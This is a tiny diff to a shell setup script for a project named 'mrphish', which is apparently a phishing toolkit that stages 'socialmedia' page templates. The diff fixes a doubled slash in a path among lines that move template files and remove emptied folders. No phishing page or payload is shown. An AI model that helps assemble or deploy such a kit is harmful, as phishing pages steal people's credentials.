@@ -89,7 +89,7 @@ rm -rf socialmedia5
 cd $HOME/mrphish/core/deploys
 cd socialmedia6
 mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME//new/mrphish/core/deploys
+cd $HOME/new/mrphish/core/deploys
 rm -rf socialmedia6
 cd $HOME/mrphish/core/deploys
 cd socialmedia7
